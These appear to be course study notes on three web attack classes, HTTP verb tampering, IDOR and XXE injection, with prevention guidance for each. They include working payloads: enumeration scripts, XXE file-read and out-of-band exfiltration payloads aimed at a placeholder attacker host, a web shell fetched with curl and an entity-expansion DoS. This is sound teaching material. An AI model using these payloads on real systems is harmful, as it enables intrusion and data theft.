# Web Attacks

## Introduction to Web Attacks

Three web attack classes: HTTP Verb Tampering, IDOR, XXE Injection.

HTTP Verb Tampering: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering  
IDOR: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References  
XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

## Intro to HTTP Verb Tampering

HTTP accepts multiple verbs beyond GET/POST. If the server or app doesn't restrict methods properly, other verbs can bypass authorization or security filters.

`HEAD` GET without response body | `PUT` writes payload to target location | `DELETE` deletes resource | `OPTIONS` lists accepted verbs | `PATCH` partial modify of resource

### Insecure Configurations

Auth scoped to specific verbs (e.g. GET+POST) leaves other verbs (e.g. HEAD) unauthenticated.

```text
<Limit GET POST>
    Require valid-user
</Limit>
```

### Insecure Coding

A security filter sanitizes only one HTTP method's parameters while the vulnerable sink reads from all methods, so sending the payload via the unchecked method bypasses the filter.

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
}
```

## Bypassing Basic Authentication

Bypass HTTP Basic Auth scoped to specific verbs by sending the restricted action with another verb the server accepts (e.g. HEAD).

```bash
curl -i -X OPTIONS http://<TARGET_IP>:<PORT>/
```

Check the `Allow` response header for accepted methods, then use Burp's Change Request Method to resend the protected request with one of them (HEAD returns no body but still triggers the action).

## Bypassing Security Filters

A security filter that checks only one HTTP method's parameters can be bypassed via a different method, since the vulnerable sink often reads all methods (e.g. PHP `$_REQUEST`).

Resend the blocked payload with the request method changed in Burp, then confirm the bypass by triggering the underlying vulnerability (e.g. command injection) the filter was meant to stop.

## Verb Tampering Prevention

### Insecure Configuration

Scoping authorization to a specific verb leaves all other verbs unprotected, even if both GET and POST are listed. Deny HEAD requests unless specifically needed.

#### Apache

```text
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

Use `LimitExcept` instead of `Limit` to cover all verbs except the ones specified.

#### Tomcat

```text
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

Use `http-method-omission` instead of `http-method` to cover all verbs except the ones specified.

#### ASP.NET

```text
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

Use `add`/`remove` to cover all verbs except the ones specified.

### Insecure Coding

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

Filter validates `$_POST` only, sink executes `$_REQUEST`; a GET value bypasses the filter and still reaches the sink. Test all request parameters in security filters, not just one method.

`$_REQUEST['param']` PHP | `request.getParameter('param')` Java | `Request['param']` C#

## Intro to IDOR

IDOR: an app exposes a direct reference to an object (file, DB record) that the user controls, with no back-end check that the requester owns it.

### What Makes an IDOR Vulnerability

A direct reference alone isn't the bug. The vulnerability is the missing access control that should compare the requester to the resource (e.g. RBAC).

### Impact of IDOR Vulnerabilities

IDOR Information Disclosure: reading other users' private files/data.  
IDOR Insecure Function Calls: calling admin-only functions or APIs as a low-privilege user (change passwords, grant roles) when the back-end doesn't deny non-admins.

## Identifying IDORs

### URL Parameters & APIs

Look for object references in URL params, APIs, or headers/cookies (e.g. `?uid=1`, `?filename=file_1.pdf`). Increment or fuzz the value to find other users' data.

### AJAX Calls

Check front-end JS for AJAX calls to endpoints not exposed in the UI (e.g. admin-only functions) and test any direct object references found there.

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
        }
    });
}
```

### Understand Hashing/Encoding

If a reference is encoded (e.g. base64), decode it, change the value, and re-encode to target other objects.

If it's hashed, check the front-end JS for the hash function/library and what value it hashes, then replicate for other values. Use a hash identifier tool if the algorithm is unknown.

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
    }
});
```

### Compare User Roles

Register multiple users and compare their requests/object references to learn how identifiers are generated, then calculate them for other users. Works when the app only checks for a valid session, not resource ownership.

## Mass IDOR Enumeration

### Insecure Parameters

A `uid` (or similar) GET parameter used as a direct reference, with no ownership check, exposes other users' data by changing the value. Predictable filenames (`Invoice_<uid>_<date>.pdf`) alone are a weaker static file IDOR than a directly controllable `uid` parameter.

### Mass Enumeration

```bash
curl -s "http://<TARGET_IP>:<PORT>/documents.php?uid=<UID>" | grep -oP "/documents.*?.pdf"
```

```bash
#!/bin/bash
url="http://<TARGET_IP>:<PORT>"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

Alternative tools: Burp Intruder, ZAP Fuzzer.

## Bypassing Encoded References

If a reference looks hashed (e.g. md5), guess common values (uid, username, filename) and compare hashes using Burp Comparer or manually.

```bash
echo -n <VALUE> | md5sum
```

### Function Disclosure

Sensitive reference calculations done in front-end JS (Angular/React/Vue apps) can be read directly and replicated.

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

```bash
echo -n <UID> | base64 -w 0 | md5sum
```

`-n` no trailing newline (echo) | `-w 0` no line wrap (base64), needed so the hash matches

### Mass Enumeration

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
#!/bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://<TARGET_IP>:<PORT>/download.php
    done
done
```

`-s` silent | `-O` save as remote filename | `-J` use Content-Disposition filename

## IDOR in Insecure APIs

Often an Information Disclosure IDOR leaks data (tokens, secondary IDs) needed to exploit an Insecure Function Call IDOR.

### Identifying Insecure APIs

Check update/edit requests for hidden fields alongside visible ones (`uid`, `uuid`, `role`); a `role` sent as a client-controlled cookie or JSON field (not derived from a back-end session) can potentially be changed to escalate privilege.

PUT = update, POST = create, DELETE = delete, GET = retrieve, by REST convention.

### Exploiting Insecure APIs

Test: change your own object ID to another user's, edit another user's record (may need a second identifier like `uuid` if an ID-match check blocks the first attempt), try creating/deleting objects, try setting a guessed privileged role value. A check on one field doesn't mean other fields are also checked. Test the GET side of the same API for Information Disclosure; it may leak the identifiers or role names blocking the function-call attacks.

## Chaining IDOR Vulnerabilities

### Information Disclosure

A GET request with another user's ID, when the only "auth" is an unvalidated role cookie, discloses that user's full record, including identifiers (e.g. `uuid`) needed to bypass function-call checks.

### Modifying Other Users' Details

With the leaked `uuid`, a PUT request using that user's identifiers succeeds, allowing their profile fields to be changed. Changing a user's email to one you control, then requesting a password reset, takes over their account. An XSS payload placed in a user-editable field executes when the victim (or an admin) views the profile.

### Chaining Two IDOR Vulnerabilities

Enumerate all users via the disclosed GET endpoint to find a privileged role name. Set that role on your own account via the PUT endpoint if the back-end doesn't validate which roles you're allowed to set. Update the role cookie to match, then retry the previously blocked privileged actions (create/delete users, mass field changes across all users).

## IDOR Prevention

### Object-Level Access Control

Map RBAC (roles/permissions) to every object; every request should be checked against the requester's role and ownership before access is granted.

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

Derive the user's role from the back-end session/token, never from a client-supplied field (cookie, JSON body).

### Object Referencing

Even with solid access control, avoid clear-text/sequential references (`uid=1`). Use strong unique references (salted hashes, UUIDv4) mapped to objects server-side, never calculated on the front-end.

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
```

Strong references don't fix broken access control by themselves (replaying one user's request under another user's session still works if ownership isn't checked); fix access control first, then strengthen references.

## Intro to XXE

XXE: unsanitized user-controlled XML input lets an attacker abuse XML features (external entities) to read files, cause DoS, or worse on the back-end.

### XML

XML stores and structures data (not display). Documents are element trees: a root element and child elements, each wrapped in tags.

`<tag>` element key | `&entity;` XML variable | `<element>value</element>` element with value | `attribute="value"` tag attribute | `<?xml version... ?>` declaration, first line, version/encoding

Escape special characters: `<` to `&lt;`, `>` to `&gt;`, `&` to `&amp;`, `"` to `&quot;`. Comments go between `<!--` and `-->`.

### XML DTD

DTD validates an XML document against a defined structure, inline or in an external file.

```text
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
]>
```

Reference an external DTD by file or URL:

```text
<!DOCTYPE email SYSTEM "email.dtd">
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### XML Entities

Define a custom entity with `ENTITY`, reference it as `&name;`. Load an external entity from a file or URL with `SYSTEM` (or `PUBLIC` for publicly declared standards).

```text
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

```text
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

## Local File Disclosure

### Identifying

Find a page/form that submits XML. Note which submitted element values get reflected in the response; that element is where to inject.

Define a DTD (if none exists in the request) and a test entity in place of a reflected value; if the entity's value appears in the response instead of the raw `&entity;` string, the app is vulnerable.

```text
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

If the app normally sends JSON, try changing `Content-Type` to `application/xml` and converting the body to XML; it may still accept and parse it.

### Reading Sensitive Files

```text
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Some Java apps return a directory listing if a directory is referenced instead of a file.

### Reading Source Code

A file containing XML special characters (`<`, `>`, `&`) or binary data breaks the entity reference. PHP's `php://filter` works around this by base64-encoding the resource so it won't break XML; PHP-only trick.

```text
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### Remote Code Execution with XXE

If the XXE prints output directly, PHP's `expect://` wrapper executes commands, but requires the (rarely installed) PHP expect module.

```text
<!ENTITY company SYSTEM "expect://id">
```

Spaces and characters like `|`, `>`, `{` break the XML syntax; replace spaces with `$IFS`.

More reliable RCE path: pull a web shell from an attacker server and write it into the webroot.

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php # write web shell
sudo python3 -m http.server <PORT> # serve shell.php
```

```text
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<ATTACKER_IP>/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

### Other XXE Attacks

XXE can drive SSRF (enumerate internal ports/pages) with the same techniques as standalone SSRF.

DoS via entity expansion, no longer effective against modern servers (e.g. Apache) that guard against entity self-reference:

```text
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

## Advanced File Disclosure

### Advanced Exfiltration with CDATA

Wrapping a file's content in a CDATA block lets non-XML-safe data (including binary) return without breaking the parser. Internal and external entities can't be joined directly; use XML Parameter Entities (`%name;`, DTD-only) instead, which only join when referenced from an external DTD.

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server <PORT>
```

```text
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:<PORT>/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

### Error Based XXE

When nothing is reflected and no output is shown, malformed XML (bad closing tag, nonexistent entity) can trigger a verbose error that leaks data (directory paths, or a joined entity's content).

```text
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```text
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:<PORT>/xxe.dtd">
  %remote;
  %error;
]>
```

Joining with a nonexistent parameter entity forces a PHP error that includes the referenced file content. Less reliable than CDATA exfiltration; may hit length limits or break on certain characters.

## Blind Data Exfiltration

### Out-of-band Data Exfiltration

When nothing is reflected and no errors show, exfiltrate by having the target send an HTTP request back to an attacker server with the file content (base64-encoded via PHP filter) as a URL parameter.

```text
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:<PORT>/?content=%file;'>">
```

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:<PORT>/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
php -S 0.0.0.0:<PORT>
```

Can also exfiltrate via DNS: place the encoded data as a subdomain and capture it with `tcpdump`.

### Automated OOB Exfiltration

XXEinjector automates basic, CDATA, error-based, and OOB blind XXE.

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Save the captured request to a file, keep only the first line, and mark the injection point with `XXEINJECT`:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: <TARGET_IP>
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```bash
ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=<PORT> --file=<FILE> --path=<TARGET_FILE> --oob=http --phpfilter
```

`--host`/`--httpport` attacker listener | `--file` saved request file | `--path` remote file to read | `--oob=http` OOB method | `--phpfilter` base64-encode output

Exfiltrated files save under `Logs/<target>/<path>` inside the tool directory.

## XXE Prevention

### Avoiding Outdated Components

XXE is usually caused by outdated XML libraries/parsers, not missing manual sanitization (unlike XSS/IDOR/SQLi). Update XML libraries and any component that parses XML (SOAP, SVG/PDF processors, etc).

PHP's `libxml_disable_entity_loader` is deprecated since PHP 8.0 and unsafe to rely on.

libxml_disable_entity_loader: https://www.php.net/manual/en/function.libxml-disable-entity-loader.php  
OWASP XXE Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php

### Using Safe XML Configurations

Disable DTDs, external entities, parameter entity processing, XInclude support, and entity reference loops. Disable displaying runtime errors (prevents error-based XXE).

Prefer JSON/YAML (and REST) over XML-based formats/APIs (SOAP) where possible. WAFs add a layer of protection but should not be relied on alone.